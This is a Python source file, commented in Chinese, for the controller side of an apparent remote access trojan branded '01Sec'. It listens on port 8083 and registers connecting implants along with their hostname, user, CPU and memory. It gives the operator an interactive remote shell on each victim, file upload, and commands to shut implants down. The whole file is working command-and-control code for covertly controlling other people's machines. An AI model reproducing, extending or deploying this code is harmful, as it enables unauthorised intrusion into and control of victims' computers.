import socket
import sys
import threading
import time
import os
from multiprocessing import Process
# from core.ccserver import cc_web


conns = {}  # 存放连接对象
sessions = {}  # 连接数
session_count = 1
localtime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))  # 获取本地当前时间
lock = threading.Lock()  # 全局锁


def init_server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[+] 初始化套接字")
    try:
        s.bind((host, port))
    except socket.error as e:
        print("[!]", e)
        sys.exit()

    s.listen(50)
    print("[+] 主控端监听在%s:%d" % (host, port))
    return s


def client_thread(conn):
    global session_count
    session_id = session_count
    conns[session_id] = conn
    session_count += 1

    #while True:
    try:
        data = conn.recv(1024)
        cominfo = data.decode().split("~")
        #print("[+] 主机名: %s 用户名: %s sid：%d Cpu：%s Meminfo: %s" % (cominfo[0], cominfo[1], session_id, cominfo[2], cominfo[3]))
        session_manager(session_id, addr, com_name=cominfo[0], com_user=cominfo[1], cpuinfo=cominfo[2], meminfo=cominfo[3], up_time=localtime)
    except (ConnectionResetError, OSError, IndexError):
        pass
    while True:
        try:
            recvdata = conn.recv(8096)
            print(recvdata.decode("gbk"))
        except (ConnectionResetError, OSError):
            break

    conn.close()


def inputter():
    lock.acquire()
    try:
        while True:
            command = input("01Sec->")
            if ">>" in command:
                shell = command.split(">>", 3)
                session_id = shell[0]  # 受控端sid号
                flag = True
                if check_session(session_id):
                    if shell[1] == "upload":
                        file_path = input("[+] 请输入文件路径：")
                        file_name = input("[+] 请输入文件名：")
                        upload_file(session_id, fpath=file_path, fname=file_name)
                        continue
                    else:
                        conns[int(session_id)].sendall(str.encode(shell[1]))
                    if shell[1] == "close":
                        if input("[*] 您是否要关闭受控端（y/n）？").startswith("y"):
                            try:
                                conns[int(session_id)].sendall(str.encode("close"))
                                remove_session(session_id)
                                print("[+] Sid：%s已经退出" % session_id)
                            except OSError:
                                remove_session(session_id)
                                print("[+] Sid：%s已经退出" % session_id)
                        continue
                    while flag:
                        if shell[1] == "shell":
                            cmd = input("01Sec->" + shell[0] + "->" + shell[1] + "->")
                            if "exit" == cmd:
                                flag = False
                                break
                            else:
                                conns[int(shell[0])].sendall(str.encode("$" + cmd))
                                continue
            elif "sessions" == command:
                session_list()
            elif "exit" == command:
                if input("[*] 您是否要关闭控制端（y/n）？").startswith("y"):
                    os._exit(0)
            # elif "quit" == command:
            #     quit_server()
            # elif "help" == command:
            #     print(__help__)
            else:
                if command == "":
                    pass
                else:
                    print("[+] 请输入help查看帮助")
    except (IndexError, KeyboardInterrupt):
        print("[!] 输入错误")


def session_manager(session_id, addr, com_name, com_user, cpuinfo, meminfo, up_time):
    try:
        global sessions
        value = addr[0] + ":" + str(addr[1]) + "|" + com_name + "|" + com_user + "|" + cpuinfo + "|" + (meminfo + "MB") + "|" + up_time
        key = session_id
        sessions[key] = value
    except Exception as e:
        print("[!]", e)


def session_list():
    print("\nSid | 连接地址 | 主机名 | 用户名 | 处理器 | 内存 | 上线时间\n" + "-"*112)
    for k, v in sessions.items():
        print("|{:>2} | {}".format(k, v))
        print("-"*112)


def remove_session(session_id):
    global sessions
    return sessions.pop(int(session_id))


def check_session(session_id):
    session_id = session_id
    for k in sessions.keys():
        if int(session_id) == k:
            return True
        else:
            print("[!] 请检查sid输入是否正确")
            return False


# def quit_server():
#     # osx = os_check()
#     if input("[*] 您是否要关闭控制端（y/n）？").startswith("y"):
#         try:
#             conn.shutdown(socket.SHUT_RDWR)  # 关闭接收发送消息通道
#             conn.close()
#             print("[+] 再见!")
#             if os_check() == "w":
#                 subprocess.Popen("taskkill /f /im python.exe", shell=False)
#             else:
#                 subprocess.Popen("killall -9 python", shell=False)
#         except OSError:
#             if os_check() == "w":
#                 subprocess.Popen("taskkill /f /im python.exe", shell=False)
#             else:
#                 subprocess.Popen("killall -9 python", shell=False)


# def cat_os():
#     osx = platform.system()
#     if osx.lower() == "windows":
#         return "w"
#     else:
#         return "l"


def upload_file(session_id, fpath, fname):
    try:
        file_name = fname
        file_path = fpath + "\\"
        file_size = os.stat(file_path + file_name).st_size
        print("[+] 文件大小：%d bytes" % file_size)
        # conns[int(session_id)].sendall(bytes((file_size)))  # 发送文件大小
        # time.sleep(1)
        with open(file_path + file_name, "rb") as f:
            conns[int(session_id)].sendall(str.encode("^"))  # 发送传输标志
            time.sleep(1)
            conns[int(session_id)].sendall(str.encode(file_name))  # 发送文件名
            time.sleep(1)
            for file_data in f:
                print(file_data)
                conns[int(session_id)].sendall(file_data)

        time.sleep(5)
        conns[int(session_id)].sendall(str.encode("EOF"))  # 发送结束符
        print("[+] %s上传成功" % file_name)
    except FileNotFoundError:
        print("[!] 没有找到文件，请检查文件是否存在")
    except OSError:
        remove_session(session_id)
        print("[!] 连接断开")


if __name__ == "__main__":
    try:
        s = init_server("0.0.0.0", 8083)
        # Process(target=cc_web, args=()).start()
        time.sleep(3)
        print("[+] 当前时间:", localtime)
        print("[+] 正在等待连接......")
        while True:
            conn, addr = s.accept()
            print("[+] 一个新连接来自" + addr[0] + ":" + str(addr[1]))

            threading.Thread(target=client_thread, args=(conn,)).start()
            threading.Thread(target=inputter, args=()).start()
    except KeyboardInterrupt:
        # quit_server()
        os._exit(0)
